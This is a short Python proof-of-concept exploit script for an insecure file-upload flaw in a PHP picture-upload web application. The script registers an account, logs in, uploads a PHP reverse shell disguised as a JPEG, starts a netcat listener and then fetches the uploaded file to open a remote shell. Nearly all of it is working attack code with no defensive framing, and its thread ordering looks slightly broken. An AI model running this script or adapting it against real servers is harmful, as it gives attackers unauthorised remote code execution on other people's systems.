#!/usr/bin/python3

import requests, sys, os, threading
# from requests_toolbelt.multipart.encoder import MultipartEncoder

def start_nc_shell():
    os.system("nc -lp 8000")

def start_rev(sess,ip,proxy):
    sess.get(ip+'/upload/17/any/rev_shell.php')

def main():
    if (len(sys.argv) < 3):
        print ("usage: ./poc.py [target ip/url] [file_to_upload]")
        sys.exit(0)

    print ("Proof of concept - Insecure file upload exploit to obtain a reverse shell")

    ip = sys.argv[1]
    script_loc = sys.argv[2]

    if not 'http' in ip:
        ip = "http://" + ip

    upload_url = "/pictures/upload.php"
    register_url = "/users/register.php"
    login_url = "/users/login.php"

    print("Posting", script_loc, " to " , ip)

    # with open(script_loc, 'rb') as x:
        # print (x.read())

    proxy = {'http' : "http://127.0.0.1:8080"}

    upload_data = {
    'tag' : 'any',
    'name' : 'rev_shell.php',
    'title' : 'any',
    'price' : '123'
    # 'pic' : script_loc
    }
    #
    register_data = {
        'username' : 'a',
        'firstname' : 'a',
        'lastname' : 'a',
        'password' : 'a',
        'againpass' : 'a'
    }


    login_data = {
        'username': 'a',
        'password' : 'a'
    }

    sess = requests.session()
    register = requests.post(ip + register_url, register_data)
    login = sess.post(ip + login_url, login_data)

    upload = sess.post(ip + upload_url, data=upload_data, files={'pic' : (script_loc, open(script_loc, 'r'), 'image/jpeg')})

    t = threading.Thread(target=start_nc_shell)
    t.start()

    # get user id?
    s = threading.Thread(target=start_rev, args=(sess,ip,proxy))
    t.join();


    s.start()

if __name__ == "__main__":
    main()
